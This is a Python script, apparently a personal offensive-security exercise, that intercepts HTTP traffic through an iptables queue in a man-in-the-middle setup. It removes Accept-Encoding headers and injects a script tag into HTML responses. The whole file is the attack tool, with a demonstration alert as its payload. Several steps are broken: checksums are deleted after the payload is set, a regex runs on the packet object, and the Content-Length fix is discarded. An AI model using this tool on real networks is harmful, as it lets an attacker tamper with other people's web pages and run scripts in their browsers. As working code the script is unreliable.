'''
    author  : zerobits01
    created : 30-Jan-2020
    purpose : a program for injecting html or js code
        in raw part of a response(MITM is required)
'''

import scapy.all as scapy
import netfilterqueue
import re

'''
    first we save the packets in a queue ans using scapy
    we access them and send or receive them :
    creating the queue is with iptables :
    > iptables -I FORWARD -j NFQUEUE --queue-num 0
    they won't be send till we want
    > pip install netfilterqueue
    # for accessing that queue
    # first we should install netfilterqueue
        i couln't so i don't upload this
    > iptables --flush # to cancel the queue
'''

ackls = []

def process_packet_cb(packet):
    inside_packet = packet.get_payload()
    scapy_packet = scapy.IP(inside_packet)

    if scapy_packet.haslayer(scapy.HTTP):
        if scapy_packet[scapy.TCP].dport == 80:
            # req
            # first we should disable encoding
            regex = re.compile(r'Accept-Encoding:\s*.*?\\r\\n')
            # ? means accept the first occurrence
            modified = regex.sub("",scapy_packet[scapy.Raw].load)
            packet.set_payload(str(modified))
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].len
            del scapy_packet[scapy.TCP].chksum
            print('request')
        elif scapy_packet[scapy.TCP].sport == 80 and \
                'text/html' in scapy_packet[scapy.Raw].load:
            # here we should inject code
            inject_string = '<script>alert(\'injected\')</script>'
            # we should inject after body part we can do with regex
            modified = scapy_packet[scapy.Raw].load.replace('</body>',
                                                            inject_string+'</body>')
            packet.set_payload(str(modified))
            content = re.search(r'(?:Content-Length:\s*)\d+',scapy_packet)
            if content :
                real_size = content.group(0)
                new_size = int(real_size) + len(inject_string)
                scapy_packet[scapy.Raw].load.replace(real_size,str(new_size))
            # for refactoring the code we can make it more clear
            #   and writing some parts in functions
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].len
            del scapy_packet[scapy.TCP].chksum
            # sometimes we should pay attention that we may refactor the length of response
            # Content-Length
            print('response')
    packet.accept()
    # packet.drop()

nf = netfilterqueue.NetFilterQueue()
nf.bind(0, process_packet_cb)
nf.run()